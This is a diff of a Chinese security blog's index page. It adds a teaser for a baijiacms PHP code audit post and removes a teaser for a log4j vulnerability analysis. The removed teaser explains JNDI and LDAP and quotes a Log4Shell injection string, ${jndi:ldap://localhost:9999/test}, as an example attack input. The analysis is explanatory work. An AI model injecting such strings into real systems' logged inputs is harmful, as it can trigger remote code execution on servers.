@@ -144,6 +144,83 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-php代码审计之baijiacms" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/">php代码审计之baijiacms</a>
+    </h1>
+  
+
+        
+        <a href="/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/" class="archive-article-date">
+  	<time datetime="2022-08-18T07:43:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p>通过对代码的一个大致结构分析，知道了它的主要功能都是在system目录下。</p>
+<p>system目录下有class和template文件，template代表是前端，class是后端处理文件。</p>
+        
+          <a class="article-more-a" href="/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/08/18/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bbaijiacms/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-jxc代码审计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -904,92 +981,6 @@
 
 
   
-    <article id="post-log4j漏洞分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/07/22/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">log4j漏洞分析</a>
-    </h1>
-  
-
-        
-        <a href="/2022/07/22/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-07-22T02:26:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="JNDI原理"><a href="#JNDI原理" class="headerlink" title="JNDI原理"></a>JNDI原理</h1><p>JNDI全程 Java Naming and Directory Interface。JNDI是JAVA平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。如同其他很多JAVA技术一样，JNDI是provider-based的技术，暴露了一个API和一个服务供应接口(SPI)。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。</p>
-<p>JNDI目前所支持的技术包括LDAP、COS名字服务、RMI、NDS、DNS、Windows注册表等等。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。JNDI通过绑定的概念对象讲对象和名称联系起来。在一个文件系统中，文件名别绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p>
-<p>JNDI中的一组绑定作为作为上下文来引用。每个上下文暴露的一组操作是一致的。例如，每个上下文提供了一个查找操作，返回指定名字的响应对象。每个上下文都提供了绑定和撤出绑定名字到某个对象的操作。JNDI使用通用的方式来暴露命名空间，即使用分层上下文以及使用相同命名语法的子上下文。</p>
-<p>简单来说：通过JNDI提供了”通过名称找到对应的对象”的规范含义，即SPI功能，实现则由具体的技术支持，如:LDAP、RMI、DNS、Database。</p>
-<p>  org.apache.commons   commons-collections4   4.0</p>
-<h1 id="LDAP原理"><a href="#LDAP原理" class="headerlink" title="LDAP原理"></a>LDAP原理</h1><p>目录服务是一个特殊的数据库，用来保存描述性的，基于描述的详细信息，支持过滤功能。</p>
-<p>LDAP，它是基于X.500标准的轻量级目录访问协议。</p>
-<p>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。目标数据库和关系数据库不通，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适用于存储修改频繁的数据库。所以目录天生是用来查询的，就好象它的名字一样。</p>
-<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p>
-<h1 id="log4j漏洞介绍"><a href="#log4j漏洞介绍" class="headerlink" title="log4j漏洞介绍"></a>log4j漏洞介绍</h1><p>Log4j2默认支持解析ldap/rmi协议，并通过名称从ldap服务端其获取对应的class文件，使用ClassLoader在本地加载Ldap服务端返回的class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容(会提供一个恶意的Class文件)的ldap协议内容(如：恶意内容${jndi:ldap://localhost:9999/test}恶意内容)，该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行(可执行任意后台指令)，从而达到攻击的目的。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220722105222581.png" alt="image-20220722105222581"></p>
-<p>1.首先攻击者找到存在风险的接口(接口会将前端输入直接通过日志打印出来)，然后向该接口发送攻击内容${jndi:ldap//localhost:9999/Test}</p>
-<p>2.被攻击服务器收到该内容后，通过Log4j2工具将其作为日志打印。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/07/22/log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1125,6 +1116,10 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">靶机渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">php代码审计</a>
               </li>
             
             <div class="clearfix"></div>
